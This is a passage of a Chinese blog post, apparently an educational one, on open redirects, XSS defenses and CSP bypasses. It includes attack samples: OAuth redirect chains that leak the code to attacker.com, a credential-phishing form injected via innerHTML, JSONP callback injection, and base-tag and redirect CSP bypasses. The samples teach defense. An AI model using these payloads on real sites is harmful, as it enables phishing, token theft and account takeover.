<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&amp; -&gt; <span class="hljs-symbol">&amp;amp;</span><br>&lt; -&gt; <span class="hljs-symbol">&amp;lt;</span><br>&gt; -&gt; <span class="hljs-symbol">&amp;gt;</span><br>&quot; (双引号) -&gt; <span class="hljs-symbol">&amp;quot;</span><br>&#x27; (单引号，依据配置) -&gt; <span class="hljs-symbol">&amp;apos;</span> 或 <span class="hljs-symbol">&amp;#039;</span> （在某些情况下）<br></code></pre></td></tr></table></figure>

<h3 id="重定向攻击"><a href="#重定向攻击" class="headerlink" title="重定向攻击"></a>重定向攻击</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/login?redirect=https:/</span>/attacker.com <br></code></pre></td></tr></table></figure>

<p>像是这样的连接 完成登录之后 或者 之前已经登录过了 会被重定向  </p>
<p>如果redirect可控 那么用户将会被重定向到任意地址  </p>
<p>最容易想到的利用方法就是钓鱼  </p>
<p>例如，假设有一个论坛存在开放重定向漏洞，而我在文章中放了一个使用开放重定向来**禁用跳转至外部网站的提示的链接。**当用户点击该链接时，他们会进入一个“精心设计的钓鱼网站”，这个网站看起来一模一样，但会弹出一个弹窗要求用户输入账号和密码，说他们的连接会话已过期，需要重新登录。此时，用户更有可能输入自己的账号和密码，因为他们没有意识到自己被重定向到了一个钓鱼网站  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202412081438728.png" srcset="/img/loading.gif" lazyload alt="1733639898156"></p>
<p><strong>与其他漏洞结合</strong>  </p>
<p>先来说重定向的实现  </p>
<ol>
<li>后端重定向，使用响应标头<code>Location</code></li>
<li>前端重定向，可能用到history.push、window.open、location等</li>
</ol>
<p>如果是后端的话 需要小心crlf攻击  </p>
<p>前端则需要考虑 xss 例如window.location.href里面可以使用javascript伪协议  </p>
<p>结合其他漏洞  </p>
<p>至少有两个 <strong>一个是ssrf 另外一个是跟oauth有关</strong>  </p>
<p> 在点击类似 <code>“使用 Facebook 登录”或“使用 Google 注册”按钮</code> 这种按钮的时候  </p>
<p>会发生一次重定向  </p>
<p>基本原理是指向<code>facebook.com/oauth.php?clientid=123&amp;state=abc&amp;redirect_uri=https://yourdomain.com/oauth</code>的链接。当用户点击此链接时，他们将转到 Facebook，在那里登录并接受您的应用所需的权限，然后重定向回<code>https://yourdomain.com/oauth?code=xyz。</code></p>
<p>现在，您的应用程序可以获取code的值，并利用该值获取用户 Facebook 帐户的部分访问权限，这一切都取决于登录屏幕上授予您的权限。攻击者还可以重复使用 code 参数的值，使用受害者的 Facebook 帐户登录应用程序。  </p>
<p>但是不能直接重定向到<code>https://attacker.com/</code> 类似于这种网站 因为这是一个外部域  </p>
<p>但是，如果攻击者在接受域上找到开放的重定向，则可能可以将它们结合起来。  </p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">facebook.com/oauth.php?clientid=<span class="hljs-number">123</span>&amp;<span class="hljs-keyword">state</span>=abc&amp;redirect_url=https://yourdomain.com/red.php?url%<span class="hljs-number">3</span>dhttps://attacker.com/<br></code></pre></td></tr></table></figure>

<p>这会导致重定向到</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//y</span>ourdomain.com<span class="hljs-regexp">/red.php?url=https:/</span><span class="hljs-regexp">/attacker.com/</span>?code=xyz<br></code></pre></td></tr></table></figure>

<p>这又会导致重定向到</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//attacker.com/?code=xyz</span><br></code></pre></td></tr></table></figure>

<p>现在攻击者可以代表该应用程序访问 Facebook 帐户。</p>
<p>那么<strong>如何防御这类重定向漏洞</strong>  </p>
<p>很容易想到就是要需要检查重定向的 URL  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">const validDomain = <span class="hljs-string">&#x27;cymetrics.io&#x27;</span><br>function <span class="hljs-built_in">validateDomain</span>(url) &#123;<br>  const host = new <span class="hljs-built_in">URL</span>(url)<span class="hljs-selector-class">.hostname</span> <span class="hljs-comment">// 取出 hostname</span><br>  return host<span class="hljs-selector-class">.includes</span>(validDomain)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">validateDomain</span><span class="hljs-params">(<span class="hljs-string">&#x27;https://example.com&#x27;</span>)</span></span> <span class="hljs-comment">// false</span><br><span class="hljs-function"><span class="hljs-title">validateDomain</span><span class="hljs-params">(<span class="hljs-string">&#x27;https://cymetrics.io&#x27;</span>)</span></span> <span class="hljs-comment">// true</span><br><span class="hljs-function"><span class="hljs-title">validateDomain</span><span class="hljs-params">(<span class="hljs-string">&#x27;https://dev.cymetrics.io&#x27;</span>)</span></span> <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure>

<p>看这段代码有什么问题 是否能防止恶意重定向  </p>
<p>看起来没什么问题吧？除了<code>cymetrics.io</code>或其子域名，其他域名应该都无法通过这个检查吧？  </p>
<p>该函数 <code>validateDomain</code> 的作用是检查一个给定的 URL 是否包含特定的有效域名（<code>cymetrics.io</code>）  </p>
<p>但是很容易想到 如果是  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cymetrics<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.yxy</span><span class="hljs-selector-class">.com</span> 或者是 fakecymetrics.io<br></code></pre></td></tr></table></figure>

<p>都可以进行绕过  </p>
<p>其实不仅仅是在检查域名的时候，直接使用<code>includes</code>或者<code>contains</code>查看整体字符串是否包含某个子字符串来进行任何检查都是比较危险的事情。  </p>
<p>最好的方法其实是设置一个允许列表，必须完全一致才能通过，这是最严格的。  </p>
<p>参考链接 : <a target="_blank" rel="noopener" href="https://blog.huli.tw/2021/09/26/en/what-is-open-redirect/">https://blog.huli.tw/2021/09/26/en/what-is-open-redirect/</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.detectify.com/industry-insights/the-real-impact-of-an-open-redirect/">https://blog.detectify.com/industry-insights/the-real-impact-of-an-open-redirect/</a>  </p>
<h3 id="防御xss"><a href="#防御xss" class="headerlink" title="防御xss"></a>防御xss</h3><p>最基本的办法  </p>
<p>编码  </p>
<p>例如 </p>
<p>前端来说 使用 innerText<code>或</code>textContent<code>代替</code>innerHTML  </p>
<p>React 和 Vue框架 都内置了类似的功能，基本逻辑是：</p>
<blockquote>
<p>默认情况下，渲染的所有内容都将被视为纯文本。如果您需要渲染 HTML，请使用特殊方法，例如<code>dangerouslySetInnerHTML</code>或<code>v-html</code>。</p>
</blockquote>
<p>在 PHP 中，可以使用<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.htmlspecialchars.php">htmlspecialchars</a>函数  </p>
<p>但是现在很多后端都不直接输出内容，而是用模板引擎来处理，比如常用的<code>handlebarsjs</code>默认<code>&#123;&#123; name &#125;&#125;</code>是编码输出，输出原始内容需要三个花括号：<code>&#123;&#123;&#123; vulnerable_to_xss &#125;&#125;&#125;</code>。</p>
<p>在 Laravel 的 Blade 中，<code>&#123;&#123; $text &#125;&#125;</code>被编码，而<code>&#123;!! $text !!&#125;</code>则不被编码。我想知道感叹号是否是一种警告：“嘿，使用时要小心。”</p>
<p>有些模板引擎会使用过滤器。例如，在 Python 的 Jinja 中，<code>&#123;&#123; text &#125;&#125;</code>是经过编码的，而<code>&#123;&#123; text | safe &#125;&#125;</code>表示内容是安全的，可以直接以原始格式输出。  </p>
<p>但是有些时候 必须要输入一下html代码来进行操作 或者 有些平台支持输入html代码  </p>
<p>那么这时候需要对这些用户输入的代码进行一下处理和过滤  </p>
<p><strong>BeautifulSoup</strong>  </p>
<p>这个库 虽然说不是专门用来处理的 是用来进行 解析html文档的 通常用来写爬虫  </p>
<p>所以说如果用来处理过滤html文档可能会出问题  </p>
<p>例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span><br></code></pre></td></tr></table></figure>

<p>对于这段代码  </p>
<p>BeautifulSoup的html解析器将此视为由 <code>&lt;--</code> 和 <code>--&gt;</code> 括起来的注释，因此它不会解析任何标签或属性。</p>
<p>但是 根据 <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/syntax.html#comments">HTML5 规范</a>，<code>&lt;--&gt;</code> 才是有效的空注释，因此上述内容将变为注释，后跟 <code>&lt;script&gt;</code> 标记和文本 <code>--&gt;</code>。</p>
<p>所以说  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>html = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  &lt;div&gt;</span><br><span class="hljs-string">    test</span><br><span class="hljs-string">    &lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span><br><span class="hljs-string">  &lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tree = BeautifulSoup(html, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> tree.find_all():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;name: <span class="hljs-subst">&#123;element.name&#125;</span>&quot;</span>)<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;attrs: <span class="hljs-subst">&#123;element.attrs&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>打开为html代码 会触发弹窗  </p>
<p>专门用于清理的库 <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify</a>   </p>
<p>默认情况下，DOMPurify 只允许安全标记，例如 <code>&lt;h1&gt;</code>、<code>&lt;p&gt;</code>、<code>&lt;div&gt;</code> 和 <code>&lt;span&gt;</code>。它还删除了所有事件处理程序并清除了前面提到的 javascript： 伪协议，确保您输入的任何 HTML 在默认情况下都不会导致 XSS。  </p>
<p><strong>第二种防御xss的办法</strong>  </p>
<p>CSP : 内容安全策略 (Content Security Policy) 的缩写，它允许您为网页建立规则，并告知浏览器只有符合这些规则的内容才允许访问。任何不符合规则的内容都应被阻止。  </p>
<p>有两种方式可以将 CSP 添加到网页中。一种是通过 HTTP 响应头<code>Content-Security-Policy</code>，另一种是通过<code>&lt;meta&gt;</code>标签。由于后者更容易演示，我们将重点介绍它（尽管前者更常用，因为有些规则只能通过它来设置）。  </p>
<p>例如  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;script-src &#x27;none&#x27;&quot;</span>&gt; <br></code></pre></td></tr></table></figure>

<p>这意味着该网页“不允许执行任何脚本”。因此，body 中的脚本不会被执行。  </p>
<p>这里的脚本不是指某个特定的脚本脚本也不是指src属性</p>
<p><code>script-src &#39;none&#39;</code>意味着“阻止任何 JavaScript 的执行”，无论是通过 script 标签、事件处理程序还是 javascript: 伪协议。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src &#x27;none&#x27;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  CSP test<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>其他常用指令包括：</p>
<ol>
<li><code>script-src</code>：管理 JavaScript</li>
<li><code>style-src</code>：管理 CSS</li>
<li><code>font-src</code>：管理字体</li>
<li><code>img-src</code>：管理图像</li>
<li><code>connect-src</code>：管理连接（fetch、XMLHttpRequest、WebSocket 等）</li>
<li><code>media-src</code>：管理视频和音频</li>
<li><code>frame-src</code>：管理框架和 iframe</li>
<li><code>base-uri</code>：管理使用<code>&lt;base&gt;</code></li>
<li><code>form-action</code>：管理表单操作</li>
<li><code>frame-ancestors</code>：管理哪些页面可以嵌入当前页面</li>
<li><code>report-uri</code>：稍后讨论</li>
<li><code>navigate-to</code>：管理页面可以导航到的位置</li>
</ol>
<p>这些指令的常用规则包括  </p>
<ol>
<li><code>*</code>- 允许除<code>data:</code>、<code>blob:</code>和之外的所有 URL <code>filesystem:</code>。</li>
<li><code>&#39;none&#39;</code>- 不允许任何事情。</li>
<li><code>&#39;self&#39;</code>- 仅允许同源资源。</li>
<li><code>https:</code>- 允许所有 HTTPS 资源。</li>
<li><code>example.com</code>- 允许特定域（HTTP 和 HTTPS）。</li>
<li><code>https://example.com</code>- 允许特定来源（仅限 HTTPS）。</li>
</ol>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">script-src <span class="hljs-string">&#x27;self&#x27;</span> cdn.example.<span class="hljs-keyword">com</span> www.google-analytics.<span class="hljs-keyword">com</span> *.facebook.net<br></code></pre></td></tr></table></figure>

<p>意思是 只有来自以上来源的脚本可以被加载和执行：</p>
<ul>
<li>当前页面的同一域名（<code>&#39;self&#39;</code>）。</li>
<li>外部的 <code>cdn.example.com</code>。</li>
<li>外部的 <code>www.google-analytics.com</code>。</li>
<li>来自任何 <code>facebook.net</code> 子域的脚本。</li>
</ul>
<p>有时脚本托管在同一个源上，因此<code>self</code>需要。有些脚本托管在 CDN 上，因此<code>cdn.example.com</code>需要。而且由于使用了 Google Analytics 和 Facebook SDK，<code>www.google-analytics.com *.facebook.net</code>因此需要加载它们的 JavaScript。  </p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//csp-evaluator.withgoogle.com/</span><br></code></pre></td></tr></table></figure>

<p>可以用这个网站确认自己的csp是否安全  </p>
<p><strong>最后一道防线</strong>  </p>
<p>假设xss一定会发生 如何做 才能使损失降到最小  </p>
<p>讨论这个之前 先要搞清楚一旦攻击者发现了xss漏洞 他会做什么 然后再根据这个去进行限制攻击者做的事  </p>
<p>最常见的就是获取用户的cookie 去进行一些危险操作 例如直接转账 或者 修改密码 或者 调用一些api去做一下危险的操作  </p>
<p>还有就是钓鱼攻击  </p>
<p>例如 </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-type">document</span>.body.innerHTML = `<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>登录已过期，请重新登录<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://attacker.com/phish&quot;</span>&gt;</span>...(要求用户输入账号密码)<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>`;<br></code></pre></td></tr></table></figure>

<p>如果只能利用xss 没有获取到用户的token 例如cookie jwt之类的  </p>
<p>那么建议在执行敏感操作时在加一层验证  </p>
<p>采用多因素认证  </p>
<p>那么为什么要获取用户的token呢  </p>
<p>好处很多 如果获取到了用户的token  </p>
<p>意味着攻击者能在任何地方访问后端 避免了同源策略的干扰  </p>
<p>并且 如果token没有时间限制的话 他们能在任何时间任何地点去发起攻击  </p>
<p>如果他们只能使用 XSS，则意味着他们只能在用户打开网页时执行攻击。一旦用户关闭网页或浏览器，他们就无法再执行 JavaScript 代码。  </p>
<h3 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h3><h4 id="通过不安全的域名"><a href="#通过不安全的域名" class="headerlink" title="通过不安全的域名"></a>通过不安全的域名</h4><p>如果您的网站使用公共 CDN 平台加载 JavaScript，例如<a target="_blank" rel="noopener" href="https://unpkg.com/">unpkg.com</a>，则有可能 CSP 规则设置为<code>script-src https://unpkg.com</code>。  </p>
<p>又因为这个公共平台能自己上传东西  </p>
<p>所以可以在平台上面上传用于绕过csp的库  </p>
<p>然后又因为csp规则是那么写的 所以可以直接引用  </p>
<p>解决办法 : 不要使用这些公共的东西 或者把路径写全  </p>
<h4 id="通过基本的元素绕过"><a href="#通过基本的元素绕过" class="headerlink" title="通过基本的元素绕过"></a>通过基本的元素绕过</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">userContent</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://example.com/my.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">abc123</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>里面的这段代码指出  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p><code>&#39;nonce-abc123&#39;</code> 表示只有具有 <code>nonce=&quot;abc123&quot;</code> 属性的 <code>&lt;script&gt;</code> 标签中的脚本才被允许执行。这是一个动态生成的随机字符串（称为“nonce”），并且每个请求中的值都是唯一的。<strong><code>&#39;nonce-abc123&#39;</code></strong> 是允许执行脚本的唯一标识符。  </p>
<p>每次页面加载时，生成的 <code>nonce</code> 都会不同。攻击者无法预先知道这个值，因此无法在他们注入的脚本中使用相同的 <code>nonce</code> 值。  </p>
<p>但是如果加上 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;base <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;https://example.com/&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p> 变成</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">userContent</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://example.com/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">abc123</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>&lt;base&gt;</code> 标签会指定一个基本的 URL，这个 URL 用于解析页面中所有相对路径的 URL  </p>
<p>例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://example.com/&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>app.js这个相对路径会变成 <code>https://example.com/app.js</code> 这个绝对路径  </p>
<p>这样能成功允许攻击者能从其他网站 例如自己的服务器加载恶意脚本  </p>
<p>防御的话只需引入  </p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">base</span>-uri <span class="hljs-string">&#x27;none&#x27;</span><br></code></pre></td></tr></table></figure>

<p>来阻止所有基本标签  </p>
<h4 id="使用JSONP来绕过"><a href="#使用JSONP来绕过" class="headerlink" title="使用JSONP来绕过"></a>使用JSONP来绕过</h4><p>JSONP 其实是一种过时的技术  </p>
<p>通过动态加载 <code>&lt;script&gt;</code> 标签来请求外部资源。因为浏览器允许跨域加载脚本，而 <code>&lt;script&gt;</code> 标签加载的资源会被执行，因此 JSONP 利用这一特性实现跨域数据获取。  </p>
<p>JSONP 的请求一般带有一个回调函数的参数 例如  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://example.com/data?callback=handleResponse&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后前端再编写一个<code>handleResponse</code> 函数用来处理数据 从而实现跨域数据的获取   </p>
<p>因为正常情况下 api返回的是一串json数据  </p>
<p>但是 JSON 格式无法被跨域加载，直接用 <code>&lt;script&gt;</code> 标签请求会报错  </p>
<p>所以采用函数进行发送和接收  </p>
<p>但是如果服务器 没有正确验证并允许传递任何字符 意味着后面的函数名字我们能任意操作  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/api/u</span>sers?callback=alert(<span class="hljs-number">1</span>);console.log<br></code></pre></td></tr></table></figure>

<p>例如变成这样  </p>
<p>那么响应就会变成  </p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs qml">alert(<span class="hljs-number">1</span>);<span class="hljs-built_in">console</span>.log([<br>  &#123;<span class="hljs-attribute">id:</span><span class="hljs-string"> 1, name</span>: <span class="hljs-string">&#x27;user01&#x27;</span>&#125;,<br>  &#123;<span class="hljs-attribute">id:</span><span class="hljs-string"> 2, name</span>: <span class="hljs-string">&#x27;user02&#x27;</span>&#125;<br>])<br></code></pre></td></tr></table></figure>

<p><strong>限制</strong>  </p>
<p>当然也会有限制  </p>
<p>例如 回调函数的名字只允许写 字母等等  </p>
<p>这时候可以尝试执行当前页面自带的方法  </p>
<p>例如说有个按钮背后的js代码有问题 可以尝试获取其dom模型下的路径 然后 click  </p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">https://example.com/api/<span class="hljs-keyword">some</span>-api?callback=document.<span class="hljs-keyword">body</span>.firstElementChild.nextElementSibling.click<br><br></code></pre></td></tr></table></figure>

<p>例如这样  </p>
<h4 id="利用重定向绕过"><a href="#利用重定向绕过" class="headerlink" title="利用重定向绕过"></a>利用重定向绕过</h4><p>csp是这样  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;script-src http://localhost:5555 https://www.google.com/a/b/c/d&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p>那么  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://https://www.google.com/test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://https://www.google.com/a/test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://localhost:5555/301&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>前两个因为路径不匹配不能执行  </p>
<p>但是会执行第三个 而第三个又是一个重定向  </p>
<p>当发生重定向时 将只检查域名 不检查路径了  </p>
<p>例如重定向到  </p>
